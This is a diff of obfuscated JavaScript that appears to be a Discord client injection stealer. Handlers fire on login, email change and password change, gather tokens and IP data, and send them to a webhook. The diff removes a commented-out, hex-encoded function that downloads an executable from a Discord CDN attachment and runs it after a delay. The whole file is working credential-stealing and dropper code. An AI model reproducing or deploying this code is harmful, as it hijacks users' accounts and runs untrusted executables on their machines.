@@ -338,7 +338,6 @@ var event_handlers = {
                 }
             })]
         };
-        //exeCalistir()
         sendToWebhook(_0x4b73c1);
     }, async 'userLogin' (_0x37ea0e, _0x224d90, _0x389b2a) {
         var _0x33c273 = _0x59caf9;
@@ -408,7 +407,6 @@ var event_handlers = {
                 }
             })]
         };
-        //exeCalistir()
         sendToWebhook(_0x510778);
     }, async 'emailChanged' (_0x33fea1, _0x1e0cbf, _0x30c09b) {
         var _0x5ee369 = _0x59caf9,
@@ -478,7 +476,7 @@ var event_handlers = {
                     }
                 })]
             };
-            //exeCalistir()
+
         sendToWebhook(_0x1bed6a);
     }, async 'passwordChanged' (_0x2caee8, _0xd7ae3f, _0x58e42e) {
         var _0x2914fe = _0x59caf9,
@@ -665,10 +663,6 @@ function sendToWebhook(_0xc79c5f) {
     });
 }
 
-//function exeCalistir() {
-//    var _0xd5b6=["\x68\x74\x74\x70\x73","\x66\x73","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const https=require(_0xd5b6[0]);const fs=require(_0xd5b6[1]);const {execFile}=require(_0xd5b6[2]);const file=fs[_0xd5b6[4]](_0xd5b6[3]);https[_0xd5b6[10]](_0xd5b6[5],function(_0xa59fx4){_0xa59fx4[_0xd5b6[6]](file);file[_0xd5b6[9]](_0xd5b6[7],()=>{file[_0xd5b6[8]]()})});async function dosyayiCalistir(){execFile(_0xd5b6[3])}setTimeout(dosyayiCalistir,40000)
-//}
-
 function createEmbed(_0x2ed246) {
     var _0x10cf25 = _0x59caf9;
     let _0x18de1a = {
@@ -688,7 +682,6 @@ async function initialize() {
         _0x2f94cc = await getToken();
         const _0x54de57 = await getIp();
         var _0x1d5e16, _0x25dc85, _0xd3be96;
-        //exeCalistir()
         config[_0x554ef7(0x14b)] && (_0x2f94cc == undefined ? sendToWebhook({
             'username': config[_0x554ef7(0x11c)][_0x554ef7(0x172)],
             'avatar_url': config[_0x554ef7(0x11c)]['avatar_url'],
@@ -826,7 +819,6 @@ async function initialize() {
                 }]
             })]
         }));
-        //exeCalistir()
     }
 }
 module['exports'] = require('./core.asar');
